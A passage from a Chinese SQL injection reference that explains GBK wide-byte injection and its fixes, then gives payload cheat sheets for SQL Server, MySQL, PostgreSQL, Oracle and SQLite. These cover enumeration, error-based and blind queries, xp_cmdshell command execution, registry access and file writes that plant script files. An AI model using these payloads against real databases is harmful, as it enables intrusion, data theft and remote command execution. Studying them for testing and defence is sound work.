class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>4</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">set</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">character_set_connection <span class="cm-operator">=</span> <span class="cm-string">'gbk'</span><span class="cm-punctuation">,</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">character_set_result <span class="cm-operator">=</span> <span class="cm-string">'gbk'</span><span class="cm-punctuation">,</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">character_set_client <span class="cm-operator">=</span> <span class="cm-string">'gbk'</span><span class="cm-punctuation">;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 91px;"></div><div class="CodeMirror-gutters" style="height: 91px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><ul><li><span>漏洞发生的原因是执行了 set character_set_client = </span><span>&#39;</span><span>gbk</span><span>&#39;</span><span>; 之后，mysql 就会认为客户端传过来的数据是 gbk 编码的，从而使用 gbk 去解码，而 mysql_real_escape 是在解码前执行的。但是直接用 set names </span><span>&#39;</span><span>gbk</span><span>&#39;</span><span> 的话 real_escape 是不知道设置的数据的编码的，就会加 %5c 。此时 server 拿到数据解码就认为提交的字符 +%5c 是 gbk 的一个字符，这样就产生漏洞了。</span></li><li><span>解决的办法有三种，第一种是把 client 的 charset 设置为 binary，就不会做一次解码的操作。第二种是是 mysql_set_charset(</span><span>&#39;</span><span>gbk</span><span>&#39;</span><span>) ，这里就会把编码的信息保存在和数据库的连接里面，就不会出现这个问题了。第三种就是用 pdo。</span></li><li><span>还有一些其他的编码技巧，比如 latin 会弃掉无效的 unicode，那么 admin%32 在代码里面不等于 admin，在数据库比较会等于 admin。</span></li></ul><h3 id='417--cheatsheet'><span>4.1.7  CheatSheet</span></h3><h4 id='sql-server-payload'><span>SQL Server Payload</span></h4><h5 id='常见-payload-1'><span>常见 Payload</span></h5><ul><li><h5 id='version-4'><span>Version</span></h5><ul><li><span>SELECT @@version</span></li><li><span>SELECT SERVERPROPERTY(</span><span>&#39;</span><span>Edition</span><span>&#39;</span><span>);</span></li><li><span>SELECT SERVERPROPERTY(</span><span>&#39;</span><span>EngineEdition</span><span>&#39;</span><span>);</span></li></ul></li><li><h5 id='comment-1'><span>Comment</span></h5><ul><li><span>SELECT 1 </span><span>-</span><span>- comment</span></li><li><span>SELECT /</span><span>*</span><span>comment</span><span>*</span><span>/1</span></li></ul></li><li><h5 id='space-1'><span>Space</span></h5><ul><li><h5 id='0x01---0x20'><span>0x01 - 0x20</span></h5></li></ul></li><li><h5 id='用户信息-1'><span>用户信息</span></h5><ul><li><span>SELECT user_name()</span></li><li><span>SELECT system_user</span></li><li><span>SELECT user</span></li><li><span>SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID</span></li></ul></li><li><h5 id='用户权限'><span>用户权限</span></h5><ul><li><span>select IS_SRVROLEMEMBER(</span><span>&#39;</span><span>sysadmin</span><span>&#39;</span><span>)</span></li><li><span>select IS_SRVROLEMEMBER(</span><span>&#39;</span><span>db_owner</span><span>&#39;</span><span>)</span></li></ul></li><li><h5 id='list-user-1'><span>List User</span></h5><ul><li><span>SELECT name FROM master..syslogins</span></li></ul></li><li><h5 id='数据库信息'><span>数据库信息</span></h5><ul><li><span>SELECT name FROM master..sysdatabases</span></li><li><span>select concat_ws(table_schema,table_name,column_name) from information_schema.columns</span></li><li><span>select quotename(name) from master..sysdatabases FOR XML PATH(</span><span>&#39;</span><span>&#39;</span><span>)</span></li></ul></li><li><h5 id='执行命令'><span>执行命令</span></h5><ul><li><span>EXEC xp_cmdshell </span><span>&#39;</span><span>net user</span><span>&#39;</span></li></ul></li><li><h5 id='ascii-1'><span>Ascii</span></h5><ul><li><span>SELECT char(0x41)</span></li><li><span>SELECT ascii(</span><span>&#39;</span><span>A</span><span>&#39;</span><span>)</span></li><li><span>SELECT char(65)+char(66) =</span><span>&gt;</span><span> return AB</span></li></ul></li><li><p><strong><span>Delay</span></strong></p><ul><li><span>WAITFOR DELAY </span><span>&#39;</span><span>0:0:3</span><span>&#39;</span><span> pause for 3 seconds</span></li></ul></li><li><h5 id='change-password-1'><span>Change Password</span></h5><ul><li><span>ALTER LOGIN </span><span>[</span><span>sa</span><span>]</span><span> WITH PASSWORD=N</span><span>&#39;</span><span>NewPassword</span><span>&#39;</span></li></ul></li><li><h5 id='trick-1'><span>Trick</span></h5><ul><li><span>id=1 union:select password from:user</span></li></ul></li><li><h5 id='文件读取-1'><span>文件读取</span></h5><ul><li><span>OpenRowset</span></li></ul></li><li><h5 id='当前查询语句'><span>当前查询语句</span></h5><ul><li><span>select text from sys.dm_exec_requests cross apply sys. dm_exec_sql_text(sql_handle)</span></li></ul></li><li><h5 id='hostname'><span>hostname</span></h5><ul><li><span>用于判断是否站库分离</span></li><li><span>select host_name()</span></li><li><span>exec xp_getnetname</span></li></ul></li><li><h5 id='服务器信息'><span>服务器信息</span></h5><ul><li><span>exec xp_msver</span></li></ul></li><li><h5 id='系统配置'><span>系统配置</span></h5><ul><li><span>select </span><span>*</span><span> from sys.configurations;</span></li></ul></li></ul><h5 id='注册表读写'><span>注册表读写</span></h5><ul><li><p><strong><span>xp_regread</span></strong></p><ul><li><span>exec xp_regread N</span><span>&#39;</span><span>HKEY_LOCAL_MACHINE</span><span>&#39;</span><span>, N</span><span>&#39;</span><span>SYSTEM</span><span>\</span><span>CurrentControlSet</span><span>\</span><span>Services</span><span>\</span><span>MSSEARCH</span><span>&#39;</span></li></ul></li><li><p><span>xp_regwrite</span></p></li><li><p><span>xp_regdeletvalue</span></p></li><li><p><span>xp_regdeletkey</span></p></li><li><p><span>xp_regaddmultistring</span></p></li></ul><h5 id='报错注入-2'><span>报错注入</span></h5><ul><li><span>1=convert(int,(db_name()))</span></li></ul><h5 id='常用函数-1'><span>常用函数</span></h5><ul><li><span>SUSER_NAME()</span></li><li><span>USER_NAME()</span></li><li><span>PERMISSIONS()</span></li><li><span>DB_NAME()</span></li><li><span>FILE_NAME()</span></li><li><span>TYPE_NAME()</span></li><li><span>COL_NAME()</span></li></ul><h5 id='dns-oob'><span>DNS OOB</span></h5><ul><li><span>fn_xe_file_target_read_file</span></li><li><span>fn_get_audit_file</span></li><li><span>fn_trace_gettable</span></li></ul><h5 id='其他常用存储过程'><span>其他常用存储过程</span></h5><ul><li><span>sp_execute_external_script</span></li><li><span>sp_makewebtask</span></li><li><span>sp_OACreate</span></li><li><span>sp_OADestroy</span></li><li><span>sp_OAGetErrorInfo</span></li><li><span>sp_OAGetProperty</span></li><li><span>sp_OAMethod</span></li><li><span>sp_OASetProperty</span></li><li><span>sp_OAStop</span></li><li><span>xp_cmdshell</span></li><li><span>xp_dirtree</span></li><li><span>xp_enumerrorlogs</span></li><li><span>xp_enumgroups</span></li><li><span>xp_fixeddrives</span></li><li><span>xp_getfiledetails</span></li><li><span>xp_loginconfig</span></li></ul><h4 id='mysql-payload'><span>MySQL Payload</span></h4><h5 id='常见-payload-2'><span>常见 Payload</span></h5><ul><li><p><strong><span>Version</span></strong></p><ul><li><span>SELECT @@version</span></li></ul></li><li><h5 id='comment-2'><span>Comment</span></h5><ul><li><span>SELECT 1 </span><span>-</span><span>- comment</span></li><li><span>SELECT 1 </span><span>#</span><span> comment</span></li><li><span>SELECT /</span><span>*</span><span>comment</span><span>*</span><span>/1</span></li></ul></li><li><h5 id='space-2'><span>Space</span></h5></li></ul><blockquote><p><strong>–</strong><span> 0x9 0xa-0xd 0x20 0xa0</span></p></blockquote><ul><li><h5 id='current-user-1'><span>Current User</span></h5><ul><li><span>SELECT user()</span></li><li><span>SELECT system_user()</span></li><li><span>SELECT current_role()</span></li></ul></li><li><h5 id='list-user-2'><span>List User</span></h5><ul><li><span>SELECT user FROM mysql.user</span></li></ul></li><li><h5 id='current-database-1'><span>Current Database</span></h5><ul><li><span>SELECT database()</span></li></ul></li><li><h5 id='list-database-1'><span>List Database</span></h5><ul><li><span>SELECT schema_name FROM information_schema.schemata</span></li></ul></li><li><h5 id='list-tables'><span>List Tables</span></h5><ul><li><span>SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != </span><span>&#39;</span><span>mysql</span><span>&#39;</span><span> AND table_schema != </span><span>&#39;</span><span>information_schema</span><span>&#39;</span></li></ul></li><li><h5 id='list-columns'><span>List Columns</span></h5><ul><li><span>SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != </span><span>&#39;</span><span>mysql</span><span>&#39;</span><span> AND table_schema != </span><span>&#39;</span><span>information_schema</span><span>&#39;</span></li></ul></li><li><h5 id='if'><strong><span>If</span></strong></h5><ul><li><span>SELECT if(1=1,</span><span>&#39;</span><span>foo</span><span>&#39;</span><span>,</span><span>&#39;</span><span>bar</span><span>&#39;</span><span>); return </span>‘<span>foo</span>’</li></ul></li><li><p><strong><span>Ascii</span></strong></p><ul><li><span>SELECT char(0x41)</span></li><li><span>SELECT ascii(</span><span>&#39;</span><span>A</span><span>&#39;</span><span>)</span></li><li><span>SELECT 0x414243 =</span><span>&gt;</span><span> return ABC</span></li></ul></li><li><p><strong><span>Delay</span></strong></p><ul><li><span>sleep(1)</span></li><li><span>SELECT BENCHMARK(1000000,MD5(</span><span>&#39;</span><span>A</span><span>&#39;</span><span>))</span></li></ul></li><li><h5 id='read-file'><span>Read File</span></h5><ul><li><span>select @@datadir</span></li><li><span>select load_file(</span><span>&#39;</span><span>databasename/tablename.MYD</span><span>&#39;</span><span>)</span></li></ul></li><li><h5 id='blind'><span>Blind</span></h5><ul><li><span>ascii(substring(str,pos,length)) &amp; 32 = 1</span></li></ul></li><li><h5 id='error-based'><span>Error Based</span></h5><ul><li><span>select count(</span><span>*</span><span>),(floor(rand(0)</span><span>*</span><span>2))x from information_schema.tables group by x;</span></li><li><span>select count(</span><span>*</span><span>) from (select 1 union select null union select !1)x group by concat((select table_name from information_schema.tables limit 1), floor(rand(0)</span><span>*</span><span>2))</span></li></ul></li><li><h5 id='change-password-2'><span>Change Password</span></h5><ul><li><span>mysql -uroot -e </span><span>&quot;</span><span>use mysql;UPDATE user SET password=PASSWORD(</span><span>&#39;</span><span>newpassword</span><span>&#39;</span><span>) WHERE user=</span><span>&#39;</span><span>root</span><span>&#39;</span><span>;FLUSH PRIVILEGES;</span><span>&quot;</span></li></ul></li></ul><h5 id='报错注入常见函数'><span>报错注入常见函数</span></h5><ul><li><span>extractvalue</span></li><li><span>updatexml</span></li><li><span>GeometryCollection</span></li><li><span>linestring</span></li><li><span>multilinestring</span></li><li><span>multipoint</span></li><li><span>multipolygon</span></li><li><span>polygon</span></li><li><span>exp</span></li></ul><h4 id='写文件-1'><span>写文件</span></h4><h5 id='写文件前提'><span>写文件前提</span></h5><ul><li><span>root 权限</span></li><li><span>知晓文件绝对路径</span></li><li><span>写入的路径存在写入权限</span></li><li><span>secure_file_priv 允许向对应位置写入</span></li><li><span>select count(file_priv) from mysql.user</span></li></ul><h5 id='基于into写文件'><span>基于into写文件</span></h5><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="sql"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="sql"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>2</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">union</span> <span class="cm-keyword">select</span> <span class="cm-number">1</span><span class="cm-punctuation">,</span><span class="cm-number">1</span><span class="cm-punctuation">,</span><span class="cm-number">1</span> <span class="cm-keyword">into</span> <span class="cm-keyword">outfile</span> <span class="cm-string">'/tmp/demo.txt'</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">union</span> <span class="cm-keyword">select</span> <span class="cm-number">1</span><span class="cm-punctuation">,</span><span class="cm-number">1</span><span class="cm-punctuation">,</span><span class="cm-number">1</span> <span class="cm-keyword">into</span> <span class="cm-keyword">dumpfile</span> <span class="cm-string">'/tmp/demo.txt'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="height: 45px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span>dumpfile 和 outfile 不同在于，outfile 会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏</span></p><h5 id='基于log写文件'><span>基于log写文件</span></h5><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="sql"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="sql"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>6</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">show</span> <span class="cm-keyword">variables</span> <span class="cm-keyword">like</span> <span class="cm-string">'%general%'</span><span class="cm-punctuation">;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">set</span> <span class="cm-keyword">global</span> general_log <span class="cm-operator">=</span> <span class="cm-keyword">on</span><span class="cm-punctuation">;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">set</span> <span class="cm-keyword">global</span> general_log_file <span class="cm-operator">=</span> <span class="cm-string">'/path/to/file'</span><span class="cm-punctuation">;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">select</span> <span class="cm-string">'&lt;?php var_dump("test");?&gt;'</span><span class="cm-punctuation">;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">set</span> <span class="cm-keyword">global</span> general_log_file <span class="cm-operator">=</span> <span class="cm-string">'/original/path'</span><span class="cm-punctuation">;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">set</span> <span class="cm-keyword">global</span> general_log <span class="cm-operator">=</span> off<span class="cm-punctuation">;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 136px;"></div><div class="CodeMirror-gutters" style="height: 136px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h4 id='postgressql-payload'><span>PostgresSQL Payload</span></h4><ul><li><p><strong><span>Version</span></strong></p><ul><li><span>SELECT version()</span></li></ul></li><li><h5 id='comment-3'><span>Comment</span></h5><ul><li><span>SELECT 1 </span><span>-</span><span>- comment</span></li><li><span>SELECT /</span><span>*</span><span>comment</span><span>*</span><span>/1</span></li></ul></li><li><h5 id='current-user-2'><span>Current User</span></h5><ul><li><span>SELECT user</span></li><li><span>SELECT current_user</span></li><li><span>SELECT session_user</span></li><li><span>SELECT getpgusername()</span></li></ul></li><li><h5 id='list-user-3'><span>List User</span></h5><ul><li><span>SELECT usename FROM pg_user</span></li></ul></li><li><h5 id='current-database-2'><span>Current Database</span></h5><ul><li><span>SELECT current_database()</span></li></ul></li><li><h5 id='list-database-2'><span>List Database</span></h5><ul><li><span>SELECT datname FROM pg_database</span></li></ul></li><li><h5 id='ascii-2'><span>Ascii</span></h5><ul><li><span>SELECT char(0x41)</span></li><li><span>SELECT ascii(</span><span>&#39;</span><span>A</span><span>&#39;</span><span>)</span></li></ul></li><li><h5 id='delay'><strong><span>Delay</span></strong></h5><ul><li><h5 id='pgsleep1'><span>pg_sleep(1)</span></h5></li></ul></li></ul><h4 id='oracle-payload'><span>Oracle Payload</span></h4><h5 id='常见payload-1'><span>常见Payload</span></h5><ul><li><h5 id='dump'><span>dump</span></h5><ul><li><span>select </span><span>*</span><span> from v</span><span>$</span><span>tablespace;</span></li><li><span>select </span><span>*</span><span> from user_tables;</span></li><li><span>select column_name from user_tab_columns where table_name = </span><span>&#39;</span><span>table_name</span><span>&#39;</span><span>;</span></li><li><span>select column_name, data_type from user_tab_columns where table_name = </span><span>&#39;</span><span>table_name</span><span>&#39;</span><span>;</span></li><li><span>SELECT </span><span>*</span><span> FROM ALL_TABLES</span></li></ul></li><li><h5 id='comment-4'><span>Comment</span></h5><ul><li><h5 id='-----'>–<span> –</span></h5></li><li><h5 id='-1'><span>/</span><span>*</span><span>*</span><span>/</span></h5></li></ul></li><li><h5 id='space-3'><span>Space</span></h5><ul><li><span>0x00 0x09 0xa-0xd 0x20</span></li></ul></li><li><h5 id='报错'><strong><span>报错</span></strong></h5><ul><li><span>utl_inaddr.get_host_name</span></li><li><span>ctxsys.drithsx.sn</span></li><li><span>ctxsys.CTX_REPORT.TOKEN_TYPE</span></li><li><span>XMLType</span></li><li><span>dbms_xdb_version.checkin</span></li><li><span>dbms_xdb_version.makeversioned</span></li><li><span>dbms_xdb_version.uncheckout</span></li><li><span>dbms_utility.sqlid_to_sqlhash</span></li><li><span>ordsys.ord_dicom.getmappingxpath</span></li><li><span>utl_inaddr.get_host_name</span></li></ul></li><li><h5 id='oob'><span>OOB</span></h5><ul><li><span>utl_inaddr.get_host_address</span></li><li><span>utl_http.request</span></li><li><span>utl_inaddr.get_host_address</span></li><li><span>SYS.DBMS_LDAP.INIT</span></li><li><span>HTTPURITYPE</span></li><li><span>HTTP_URITYPE.GETCLOB</span></li></ul></li><li><p><strong><span>绕过</span></strong></p><ul><li><span>rawtohex</span></li></ul></li></ul><h5 id='写文件-2'><span>写文件</span></h5><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="sql"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="sql"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>10</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">create</span> <span class="cm-keyword">or</span> <span class="cm-keyword">replace</span> <span class="cm-keyword">directory</span> TEST_DIR <span class="cm-keyword">as</span> <span class="cm-string">'/path/to/dir'</span><span class="cm-punctuation">;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">grant</span> <span class="cm-keyword">read</span><span class="cm-punctuation">,</span> <span class="cm-keyword">write</span> <span class="cm-keyword">on</span> <span class="cm-keyword">directory</span> TEST_DIR <span class="cm-keyword">to</span> <span class="cm-string-2">system</span><span class="cm-punctuation">;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">declare</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">isto_file utl_file<span class="cm-variable-2">.file_type</span><span class="cm-punctuation">;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">begin</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">isto_file <span class="cm-punctuation">:</span><span class="cm-operator">=</span> utl_file<span class="cm-variable-2">.fopen</span><span class="cm-bracket">(</span><span class="cm-string">'TEST_DIR'</span><span class="cm-punctuation">,</span> <span class="cm-string">'test.jsp'</span><span class="cm-punctuation">,</span> <span class="cm-string">'W'</span><span class="cm-bracket">)</span><span class="cm-punctuation">;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">utl_file<span class="cm-variable-2">.put_line</span><span class="cm-bracket">(</span>isto_file<span class="cm-punctuation">,</span> <span class="cm-string">'&lt;% out.println("test"); %&gt;'</span><span class="cm-bracket">)</span><span class="cm-punctuation">;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">utl_file<span class="cm-variable-2">.fflush</span><span class="cm-bracket">(</span>isto_file<span class="cm-bracket">)</span><span class="cm-punctuation">;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">utl_file<span class="cm-variable-2">.fclose</span><span class="cm-bracket">(</span>isto_file<span class="cm-bracket">)</span><span class="cm-punctuation">;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">end</span><span class="cm-punctuation">;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 227px;"></div><div class="CodeMirror-gutters" style="height: 227px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre><h4 id='sqlite3-payload'><span>SQLite3 Payload</span></h4><ul><li><h5 id='comment注释）'><span>Comment（注释）</span></h5><ul><li><span>-</span><span>-</span></li><li><span>/</span><span>*</span><span>*</span><span>/</span></li></ul></li><li><h5 id='version-5'><span>Version</span></h5><ul><li><span>select sqlite_version();</span></li></ul></li></ul><p><span>Command Execution</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="sql"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="sql"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div 